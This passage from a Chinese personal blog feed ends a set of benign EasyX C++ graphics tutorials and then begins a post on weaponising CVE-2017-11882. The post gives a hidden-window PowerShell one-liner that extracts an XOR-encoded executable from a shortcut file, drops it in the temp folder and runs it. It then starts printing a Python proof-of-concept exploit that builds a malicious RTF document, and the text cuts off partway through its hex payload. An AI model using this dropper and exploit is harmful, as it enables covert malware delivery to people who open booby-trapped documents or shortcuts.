class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 打开音乐, alias取别名</span></span><br><span class="line"><span class="built_in">mciSendString</span>(<span class="string">L&quot;open ./music/1.mp3 alias bgm&quot;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 播放音乐，repeat重复播放</span></span><br><span class="line"><span class="built_in">mciSendString</span>(<span class="string">L&quot;play bgm repeat&quot;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Change_Caption</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 设置窗口标题</span></span><br><span class="line">HWND hnd = <span class="built_in">GetHWnd</span>();<span class="comment">//获取窗口句柄</span></span><br><span class="line"><span class="built_in">SetWindowText</span>(hnd, <span class="string">L&quot;欢迎来到DQY&amp;WYの小窝~&quot;</span>);<span class="comment">//设置窗口标题 第一个参数传入窗口句柄，第二个参数设置字符串</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SetText</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">/* 文字设置 */</span></span><br><span class="line"><span class="built_in">settextcolor</span>(BLACK);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置文字样式</span></span><br><span class="line"><span class="comment">// 高度；宽度(0: 自适应)；系统字体</span></span><br><span class="line"><span class="built_in">settextstyle</span>(<span class="number">20</span>, <span class="number">0</span>, <span class="string">L&quot;楷体&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置文字背景模式为透明</span></span><br><span class="line"><span class="built_in">setbkmode</span>(TRANSPARENT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Set_Graphics</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 设置线条样式，设置一次影响后面所有</span></span><br><span class="line"><span class="comment">// 实线；宽度5</span></span><br><span class="line"><span class="built_in">setlinestyle</span>(PS_DASH, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置线条颜色，设置一次影响后面所有</span></span><br><span class="line"><span class="built_in">setlinecolor</span>(BROWN);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置填充颜色，设置一次影响后面所有</span></span><br><span class="line"><span class="built_in">setfillcolor</span>(YELLOW);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">MessageBox</span>(<span class="built_in">GetHWnd</span>(), <span class="string">L&quot;欢迎来到欢迎来到DQY&amp;WYの小窝~要开始游戏嘛？&quot;</span>, <span class="string">L&quot;提示&quot;</span>, MB_YESNO) != IDYES)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(<span class="built_in">GetHWnd</span>(), <span class="string">L&quot;不开始游戏就无法继续噢！&quot;</span>, <span class="string">L&quot;警告&quot;</span>, MB_OK);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">KeyHit</span><span class="params">(<span class="type">int</span> &amp;x, <span class="type">int</span> &amp;y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (_kbhit())</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">GetAsyncKeyState</span>(VK_UP))</span><br><span class="line">&#123;</span><br><span class="line">y--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">GetAsyncKeyState</span>(VK_DOWN))</span><br><span class="line">&#123;</span><br><span class="line">y++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">GetAsyncKeyState</span>(VK_LEFT))</span><br><span class="line">&#123;</span><br><span class="line">x--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">GetAsyncKeyState</span>(VK_RIGHT))</span><br><span class="line">&#123;</span><br><span class="line">x++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MouseHit</span><span class="params">(<span class="keyword">struct</span> round_rec fill_roundrec, ExMessage &amp;msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">peekmessage</span>(&amp;msg, EM_MOUSE))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span> (msg.message)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_LBUTTONDOWN:</span><br><span class="line"><span class="keyword">if</span> (msg.x &gt;= fill_roundrec.left &amp;&amp; msg.x &lt;= fill_roundrec.right &amp;&amp; msg.y &gt;= fill_roundrec.top &amp;&amp; msg.y &lt;= fill_roundrec.bottom)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(<span class="built_in">GetHWnd</span>(), <span class="string">L&quot;我只是个摆设噢~&quot;</span>, <span class="string">L&quot;阿巴阿巴&quot;</span>, MB_OK);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">/* 窗口设置 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个窗口, 宽640，高480</span></span><br><span class="line"><span class="comment">// initgraph(640, 480, SHOWCONSOLE | NOCLOSE | NOMINIMIZE);</span></span><br><span class="line"><span class="built_in">initgraph</span>(<span class="number">720</span>, <span class="number">480</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 改变窗口标题</span></span><br><span class="line"><span class="built_in">Change_Caption</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 播放音乐</span></span><br><span class="line"><span class="built_in">BGM</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 是否开始</span></span><br><span class="line"><span class="built_in">Start</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置文本和图形</span></span><br><span class="line"><span class="built_in">SetText</span>();</span><br><span class="line"><span class="built_in">Set_Graphics</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 加载并显示图片 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 图片对象</span></span><br><span class="line">IMAGE img;</span><br><span class="line"><span class="comment">// 加载图片</span></span><br><span class="line"><span class="built_in">loadimage</span>(&amp;img, <span class="string">L&quot;./images/1.jpg&quot;</span>, <span class="number">720</span>, <span class="number">480</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 绘图</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">round_rec</span> fill_roundrec = &#123; <span class="number">50</span>, <span class="number">150</span>, <span class="number">150</span>, <span class="number">200</span>, <span class="number">10</span>, <span class="number">50</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 居中输出文字</span></span><br><span class="line"><span class="comment">// L；TEXT()；项目-&gt;属性-&gt;高级-&gt;多字节字符集</span></span><br><span class="line"><span class="type">wchar_t</span> str[] = <span class="string">L&quot;Button&quot;</span>;</span><br><span class="line"><span class="comment">// 求字符串宽度</span></span><br><span class="line"><span class="type">int</span> width = <span class="built_in">textwidth</span>(str);</span><br><span class="line"><span class="comment">// 求字符串高度</span></span><br><span class="line"><span class="type">int</span> height = <span class="built_in">textheight</span>(str);</span><br><span class="line"><span class="comment">// 横坐标 = left + ((right - left) - width) / 2</span></span><br><span class="line"><span class="type">int</span> tx = fill_roundrec.left + (fill_roundrec.right - fill_roundrec.left - width) / <span class="number">2</span>;</span><br><span class="line"><span class="comment">// 纵坐标 = top + ((bottom - top) - height) / 2</span></span><br><span class="line"><span class="type">int</span> ty = fill_roundrec.top + (fill_roundrec.bottom - fill_roundrec.top - height) / <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> x = <span class="number">50</span>, y = <span class="number">50</span>;</span><br><span class="line">ExMessage msg;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 缓冲，防止图片闪烁</span></span><br><span class="line"><span class="built_in">BeginBatchDraw</span>();</span><br><span class="line"><span class="built_in">cleardevice</span>();</span><br><span class="line"><span class="built_in">putimage</span>(<span class="number">0</span>, <span class="number">0</span>, &amp;img);</span><br><span class="line"><span class="built_in">fillcircle</span>(x, y, <span class="number">50</span>);</span><br><span class="line"><span class="built_in">fillroundrect</span>(fill_roundrec.left, fill_roundrec.top, fill_roundrec.right, fill_roundrec.bottom, fill_roundrec.ew, fill_roundrec.eh);</span><br><span class="line"><span class="built_in">outtextxy</span>(tx, ty, str);</span><br><span class="line"><span class="comment">// 应该在这里结束批量绘图</span></span><br><span class="line"><span class="built_in">EndBatchDraw</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 鼠标消息</span></span><br><span class="line"><span class="built_in">MouseHit</span>(fill_roundrec, msg);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 键盘消息</span></span><br><span class="line"><span class="built_in">KeyHit</span>(x, y);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 保留窗口</span></span><br><span class="line"><span class="built_in">getchar</span>();</span><br><span class="line"><span class="comment">// 关闭窗口</span></span><br><span class="line"><span class="built_in">closegraph</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="其他样例"><a href="#其他样例" class="headerlink" title="其他样例"></a>其他样例</h2><h3 id="基础画板"><a href="#基础画板" class="headerlink" title="基础画板"></a>基础画板</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;easyx.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">COLORREF color[<span class="number">4</span>] = &#123;RED, <span class="built_in">RGB</span>(<span class="number">255</span>, <span class="number">174</span>, <span class="number">201</span>), BLACK, WHITE&#125;;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;<span class="comment">// 选择颜色</span></span><br><span class="line"><span class="type">int</span> r = <span class="number">1</span>;<span class="comment">// 圆形半径</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 窗口设置 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个窗口, 宽640，高480</span></span><br><span class="line"><span class="comment">// initgraph(640, 480, SHOWCONSOLE | NOCLOSE | NOMINIMIZE);</span></span><br><span class="line"><span class="built_in">initgraph</span>(<span class="number">600</span>, <span class="number">800</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置窗口标题</span></span><br><span class="line">HWND hnd = <span class="built_in">GetHWnd</span>();<span class="comment">//获取窗口句柄</span></span><br><span class="line"><span class="built_in">SetWindowText</span>(hnd, <span class="string">L&quot;欢迎来到DQY&amp;WYの小窝~&quot;</span>);<span class="comment">//设置窗口标题 第一个参数传入窗口句柄，第二个参数设置字符串</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置背景颜色</span></span><br><span class="line"><span class="built_in">setbkcolor</span>(WHITE);</span><br><span class="line"><span class="comment">// 清屏, 必须在设置背景颜色后使用才有效果</span></span><br><span class="line"><span class="built_in">cleardevice</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">setfillcolor</span>(color[i]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 绘图</span></span><br><span class="line">ExMessage msg;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">peekmessage</span>(&amp;msg, EM_MOUSE | EM_KEY))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span> (msg.message)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_MOUSEMOVE:</span><br><span class="line"><span class="keyword">if</span> (msg.lbutton)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">BeginBatchDraw</span>();</span><br><span class="line"><span class="built_in">solidcircle</span>(msg.x, msg.y, r);</span><br><span class="line"><span class="built_in">EndBatchDraw</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> WM_KEYDOWN:</span><br><span class="line"><span class="keyword">if</span> (msg.vkcode == <span class="string">&#x27;a&#x27;</span> || msg.vkcode == <span class="string">&#x27;A&#x27;</span> || msg.vkcode == <span class="string">&#x27;d&#x27;</span> || msg.vkcode == <span class="string">&#x27;D&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">++i;</span><br><span class="line">i %= <span class="number">4</span>;</span><br><span class="line"><span class="built_in">setfillcolor</span>(color[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (msg.vkcode == <span class="string">&#x27;q&#x27;</span> || msg.vkcode == <span class="string">&#x27;Q&#x27;</span> || msg.vkcode == <span class="string">&#x27;e&#x27;</span> || msg.vkcode == <span class="string">&#x27;E&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">r += <span class="number">4</span>;</span><br><span class="line">r %= <span class="number">25</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 保留窗口</span></span><br><span class="line"><span class="built_in">getchar</span>();</span><br><span class="line"><span class="comment">// 关闭窗口</span></span><br><span class="line"><span class="built_in">closegraph</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="输入框"><a href="#输入框" class="headerlink" title="输入框"></a>输入框</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 编译环境：VC2008 及以上版本，Unicode 字符集</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;graphics.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;conio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 初始化绘图窗口</span></span><br><span class="line"><span class="built_in">initgraph</span>(<span class="number">640</span>, <span class="number">480</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义字符串缓冲区，并接收用户输入</span></span><br><span class="line"><span class="type">wchar_t</span> s[<span class="number">10</span>];</span><br><span class="line"><span class="built_in">InputBox</span>(s, <span class="number">10</span>, <span class="string">L&quot;请输入半径&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将用户输入转换为数字</span></span><br><span class="line"><span class="type">int</span> r = _wtoi(s);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 画圆</span></span><br><span class="line"><span class="built_in">circle</span>(<span class="number">320</span>, <span class="number">240</span>, r);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 按任意键退出</span></span><br><span class="line">_getch();</span><br><span class="line"><span class="built_in">closegraph</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
          <category> EasyX </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EasyX </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用CVE-2017-11882尝试本地捆绑</title>
      <link href="/post/ed8f2b51.html"/>
      <url>/post/ed8f2b51.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文希望借鉴<a href="https://www.dqywy.top/post/ba5041c3.html">lnk捆绑执行exe</a>的方式，利用已有poc代码<a href="https://github.com/rip1s/CVE-2017-11882">605字节/17k字节版本Poc</a>实现本地捆绑，还有很多不足的地方需要修改，只是一次尝试</p><h2 id="本地捆绑"><a href="#本地捆绑" class="headerlink" title="本地捆绑"></a>本地捆绑</h2><p>快捷方式捆绑文件配合已有的<code>poc</code>代码，利用<code>powershell</code>命令释放捆绑文件并执行</p><p>注：</p><ul><li><code>PowerShell</code> <code>Get-Content</code>用于在指定位置获取项目的内容。 <code>gc</code>，<code>cat</code>和<code>type</code>是该<code>cmdlet</code>的别名</li><li>在<code>cmd</code>输入<code>cmd.exe</code>提示无法运行该程序，可以看看当前执行路径是不是有<code>cmd.exe</code>，删掉即可</li></ul><h3 id="理想代码"><a href="#理想代码" class="headerlink" title="理想代码"></a>理想代码</h3><p>注：<code>^</code>是转义符，有的地方报错可以直接删掉</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /c powershell <span class="literal">-windowstyle</span> <span class="keyword">hidden</span> <span class="variable">$lnkpath</span> = <span class="built_in">Get-ChildItem</span> *.lnk ^| <span class="built_in">where-object</span> &#123;<span class="variable">$_</span>.length <span class="operator">-eq</span> [<span class="type">TOTAL_LNK_FILE_SIZE</span>]&#125; ^| <span class="built_in">Select-Object</span> <span class="literal">-ExpandProperty</span> Name; <span class="variable">$file</span> = <span class="built_in">gc</span> <span class="variable">$lnkpath</span> <span class="literal">-Encoding</span> Byte; <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$file</span>.count; <span class="variable">$i</span>++) &#123; <span class="variable">$file</span>[<span class="variable">$i</span>] = <span class="variable">$file</span>[<span class="variable">$i</span>] <span class="operator">-bxor</span> <span class="number">0</span>x77 &#125;; <span class="variable">$path</span> = <span class="string">&#x27;%temp%\tmp&#x27;</span> + (<span class="built_in">Get-Random</span>) + <span class="string">&#x27;.exe&#x27;</span>; <span class="built_in">sc</span> <span class="variable">$path</span> ([<span class="built_in">byte</span>[]](<span class="variable">$file</span>^| <span class="built_in">select</span> <span class="literal">-Skip</span> [<span class="type">LNK_FILE_SIZE_EXCLUDING_EXE</span>])) <span class="literal">-Encoding</span> Byte; ^&amp; <span class="variable">$path</span>;</span><br></pre></td></tr></table></figure><h3 id="实际使用"><a href="#实际使用" class="headerlink" title="实际使用"></a>实际使用</h3><p>由于引号冲突，所以我在<code>poc</code>里面使用长字符串将<code>-c</code>参数直接设置成需要的命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># Original poc :https://github.com/embedi/CVE-2017-11882</span></span><br><span class="line"><span class="comment"># This version accepts a command with 17967 bytes long in maximum.</span></span><br><span class="line"><span class="comment"># Sorry I don&#x27;t know how to read the struct in objdata, hence I cannot modify the length parameter to aquire a arbitrary length code execution.</span></span><br><span class="line"><span class="comment"># But that&#x27;s enough for exploitation. I bet your shellcode is shorter.:)</span></span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">&quot;@unamer&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">head17k = <span class="string">r&#x27;&#x27;&#x27;&#123;\rtf1\ansi\ansicpg1252\deff0\nouicompat\deflang1033&#123;\fonttbl&#123;\f0\fnil\fcharset0 Calibri;&#125;&#125;</span></span><br><span class="line"><span class="string">&#123;\*\generator Riched20 6.3.9600&#125;\viewkind4\uc1</span></span><br><span class="line"><span class="string">\pard\sa200\sl276\slmult1\f0\fs22\lang9&#123;\object\objemb\objupdate&#123;\*\objclass Equation.3&#125;\objw380\objh260&#123;\*\objdata 01050000020000000B0000004571756174696F6E2E3300000000000000000000540000D0CF11E0A1B11AE1000000000000000000000000000000003E000300FEFF0900060000000000000000000000010000000100000000000000001000000200000001000000FEFFFFFF0000000000000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFDFFFFFF04000000FEFFFFFFFEFFFFFFFEFFFFFF060000000700000008000000090000000A0000000B0000000C0000000D0000000E0000000F000000100000001100000012000000130000001400000015000000160000001700000018000000190000001A0000001B0000001C000000